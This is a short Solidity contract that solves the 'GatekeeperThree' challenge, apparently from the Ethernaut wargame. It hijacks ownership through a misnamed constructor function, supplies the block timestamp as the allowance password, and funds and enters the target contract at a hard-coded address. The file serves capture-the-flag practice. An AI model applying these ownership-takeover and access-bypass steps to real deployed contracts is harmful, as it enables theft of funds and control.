// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperThree.sol";

contract Solve {
    // 1. create with 0.001 ether exactly
    constructor() payable {}

    // 2. cast send "run()"
    function run() external {
        GatekeeperThree victim = GatekeeperThree(payable(0x32844cFd3fA795dE0C5fCE240eC8639aB7eD0815));
        victim.construct0r();

        victim.createTrick();
        victim.getAllowance(block.timestamp);

        address(victim).call{value: 0.0011 ether}("");
        
        victim.enter();
    }
}